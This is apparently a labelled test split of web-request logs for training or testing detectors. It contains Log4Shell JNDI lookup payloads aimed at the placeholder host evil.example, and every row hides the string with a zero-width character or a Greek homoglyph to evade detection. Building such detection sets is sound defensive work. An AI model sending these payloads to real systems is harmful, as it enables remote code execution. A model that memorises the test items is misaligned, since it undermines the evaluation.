id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-001321,2026-05-17,adversarial_evasion,GET /?q=${jnd‍i:ldap://evil.example/zw-d} HTTP/1.1,get /?q=${jnd‍i:ldap://evil.example/zw-d} http/1.1,1,log4shell,zero_width_jndi,minimal_query,adversarial_evasion_test,critical
LS-001322,2026-05-17,adversarial_evasion,GET /api/check?debug=${jnd‍i:ldap://evil.example/zw-d} HTTP/1.1 Host: app.local,get /api/check?debug=${jnd‍i:ldap://evil.example/zw-d} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,adversarial_evasion_test,critical
LS-001323,2026-05-17,adversarial_evasion,Request from User-Agent: ${jnd‍i:ldap://evil.example/zw-d} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jnd‍i:ldap://evil.example/zw-d} | method: get | host: app.local | path: /static/app.js,1,log4shell,zero_width_jndi,user_agent,adversarial_evasion_test,critical
LS-001324,2026-05-17,adversarial_evasion,Request from User-Agent: ${jnd‍i:ldap://evil.example/zw-d},request from user-agent: ${jnd‍i:ldap://evil.example/zw-d},1,log4shell,zero_width_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001325,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${jnd‍i:ldap://evil.example/zw-d},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /metrics | x-api-version: ${jnd‍i:ldap://evil.example/zw-d},1,log4shell,zero_width_jndi,x_api_version,adversarial_evasion_test,critical
LS-001326,2026-05-17,adversarial_evasion,GET /search?q=${jnd‍i:ldap://evil.example/zw-d} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${jnd‍i:ldap://evil.example/zw-d} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,zero_width_jndi,path,adversarial_evasion_test,critical
LS-001327,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${jnd‍i:ldap://evil.example/zw-d},post /search http/1.1 host: app.local body: query=${jnd‍i:ldap://evil.example/zw-d},1,log4shell,zero_width_jndi,body,adversarial_evasion_test,critical
LS-001328,2026-05-17,adversarial_evasion,GET /?q=${jnd‍i:ldap://evil.example/zw-d} HTTP/1.1,get /?q=${jnd‍i:ldap://evil.example/zw-d} http/1.1,1,log4shell,zero_width_jndi,minimal_query,adversarial_evasion_test,critical
LS-001329,2026-05-17,adversarial_evasion,GET /api/check?debug=${jnd‍i:ldap://evil.example/zw-d} HTTP/1.1 Host: app.local,get /api/check?debug=${jnd‍i:ldap://evil.example/zw-d} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,adversarial_evasion_test,critical
LS-001330,2026-05-17,adversarial_evasion,Request from User-Agent: ${jnd‍i:ldap://evil.example/zw-d} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jnd‍i:ldap://evil.example/zw-d} | method: get | host: app.local | path: /static/app.js,1,log4shell,zero_width_jndi,user_agent,adversarial_evasion_test,critical
LS-001331,2026-05-17,adversarial_evasion,Request from User-Agent: ${jnd‍i:ldap://evil.example/zw-d},request from user-agent: ${jnd‍i:ldap://evil.example/zw-d},1,log4shell,zero_width_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001332,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${jnd‍i:ldap://evil.example/zw-d},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jnd‍i:ldap://evil.example/zw-d},1,log4shell,zero_width_jndi,x_api_version,adversarial_evasion_test,critical
LS-001333,2026-05-17,adversarial_evasion,GET /?q=${ϳndi:ldap://evil.example/greek-j} HTTP/1.1,get /?q=${ϳndi:ldap://evil.example/greek-j} http/1.1,1,log4shell,homoglyph_jndi,minimal_query,adversarial_evasion_test,critical
LS-001334,2026-05-17,adversarial_evasion,GET /api/check?debug=${ϳndi:ldap://evil.example/greek-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ϳndi:ldap://evil.example/greek-j} http/1.1 host: app.local,1,log4shell,homoglyph_jndi,uri_param,adversarial_evasion_test,critical
LS-001335,2026-05-17,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://evil.example/greek-j} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${ϳndi:ldap://evil.example/greek-j} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,homoglyph_jndi,user_agent,adversarial_evasion_test,critical
LS-001336,2026-05-17,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://evil.example/greek-j},request from user-agent: ${ϳndi:ldap://evil.example/greek-j},1,log4shell,homoglyph_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001337,2026-05-17,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${ϳndi:ldap://evil.example/greek-j},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: / | x-api-version: ${ϳndi:ldap://evil.example/greek-j},1,log4shell,homoglyph_jndi,x_api_version,adversarial_evasion_test,critical
LS-001338,2026-05-17,adversarial_evasion,GET /search?q=${ϳndi:ldap://evil.example/greek-j} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${ϳndi:ldap://evil.example/greek-j} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,homoglyph_jndi,path,adversarial_evasion_test,critical
LS-001339,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${ϳndi:ldap://evil.example/greek-j},post /search http/1.1 host: app.local body: query=${ϳndi:ldap://evil.example/greek-j},1,log4shell,homoglyph_jndi,body,adversarial_evasion_test,critical
LS-001340,2026-05-17,adversarial_evasion,GET /?q=${ϳndi:ldap://evil.example/greek-j} HTTP/1.1,get /?q=${ϳndi:ldap://evil.example/greek-j} http/1.1,1,log4shell,homoglyph_jndi,minimal_query,adversarial_evasion_test,critical
